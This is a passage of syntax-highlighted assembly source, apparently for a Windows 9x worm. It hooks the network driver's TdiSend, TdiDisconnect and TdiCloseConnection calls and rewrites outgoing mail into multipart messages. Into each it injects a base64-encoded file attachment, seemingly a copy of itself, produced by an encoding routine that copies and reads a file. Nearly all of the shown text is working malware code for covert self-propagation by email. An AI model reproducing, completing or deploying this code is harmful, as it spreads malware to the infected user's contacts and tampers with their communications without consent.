        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; copy my multipart/mixed header</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myMultipartMixed</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; copy my boundary name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myBoundary</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; copy my used boundary name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myUseBoundary</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; copy original mail</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mark1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mark2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; copy my used boundary name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myUseBoundary</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; copy attachement header</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myAttachHeader</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; base64 encoded file copy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">heap_enc_addr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">encoded_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; close boundary</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myEndBoundary</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncpy</span><span class="sc0">

        </span><span class="sc1">; set new source buffer address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; eax = *SendBuffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newmailaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; source buffer</span><span class="sc0">
        </span><span class="sc1">; set new buffer length</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newmailaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.set_len</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">.set_len</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; buffer length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; buffer length</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">;       jmp [TdiSend_Jmp]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc0">
</span><span class="sc5">TdiSend_Jmp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  TdiDisconnect_Hook</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TdiDisconnect_Hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">; MOV   EDI, &lt;address_of_code_in_heap&gt;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0xBF</span><span class="sc0">
</span><span class="sc5">TdiDisconnect_Delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

        </span><span class="sc1">; check if disconnecting our connection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TraceHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

        </span><span class="sc1">; free the memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newmailaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_HeapFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">;       jmp [TdiDisconnect_Jmp]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc0">
</span><span class="sc5">TdiDisconnect_Jmp</span><span class="sc4">:</span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  TdiCloseConnection_Hook</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TdiCloseConnection_Hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">; MOV   EDI, &lt;address_of_code_in_heap&gt;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0xBF</span><span class="sc0">
</span><span class="sc5">TdiCloseConnection_Delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

        </span><span class="sc1">; check if closing our connection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TraceHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

        </span><span class="sc1">; free the memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newmailaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_HeapFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">;       jmp [TdiCloseConnection_Jmp]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc0">
</span><span class="sc5">TdiCloseConnection_Jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  String comparation non case sensitive</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Params:</span><span class="sc0">
</span><span class="sc1">;   ESI = source</span><span class="sc0">
</span><span class="sc1">;   EDX = destination</span><span class="sc0">
</span><span class="sc1">;   ECX = length</span><span class="sc0">
</span><span class="sc1">;  Return:</span><span class="sc0">
</span><span class="sc1">;   EAX = 0 if strings match</span><span class="sc0">
</span><span class="sc1">;   EAX = 1 if not match</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">strncmpi</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc5">.loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc1">; if Caps Lock the make it non Caps</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc0">        </span><span class="sc1">; 'A'</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">.great_then_A</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.done_with_1</span><span class="sc0">
</span><span class="sc5">.great_then_A</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5A</span><span class="sc0">        </span><span class="sc1">; 'Z'</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">.less_then_Z</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.done_with_1</span><span class="sc0">
</span><span class="sc5">.less_then_Z</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc0">

</span><span class="sc5">.done_with_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; if Caps Lock the make it non Caps</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc0">        </span><span class="sc1">; 'A'</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">.great_then_A_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.done</span><span class="sc0">
</span><span class="sc5">.great_then_A_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5A</span><span class="sc0">        </span><span class="sc1">; 'Z'</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">.less_then_Z_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.done</span><span class="sc0">
</span><span class="sc5">.less_then_Z_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc0">

</span><span class="sc5">.done</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; now it should be lower case</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.not_match</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">.loop</span><span class="sc0">

        </span><span class="sc1">; if we are here then the strings are identical</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

</span><span class="sc5">.not_match</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; if we are here then the strings are not identical</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  String length</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Params:</span><span class="sc0">
</span><span class="sc1">;   ESI = source</span><span class="sc0">
</span><span class="sc1">;  Return:</span><span class="sc0">
</span><span class="sc1">;   EAX = length</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">strlen</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">.not_zero</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc9">.exit</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.not_zero</span><span class="sc0">
</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  String copy (length specified)</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Params:</span><span class="sc0">
</span><span class="sc1">;   ESI = source</span><span class="sc0">
</span><span class="sc1">;   EDX = destination</span><span class="sc0">
</span><span class="sc1">;   ECX = length</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">strncpy</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Encode in base64 the file</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Params:</span><span class="sc0">
</span><span class="sc1">;   ESI = source filename</span><span class="sc0">
</span><span class="sc1">;  Return:</span><span class="sc0">
</span><span class="sc1">;   EAX = address of encoded buffer</span><span class="sc0">
</span><span class="sc1">;   ECX = size of encoded file</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">encode</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">; copy it, so we have read-write access</span><span class="sc0">
        </span><span class="sc1">; (if the program is started then we have readonly access)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">tempFileName</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tempFileName</span><span class="sc0">

        </span><span class="sc1">; open file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
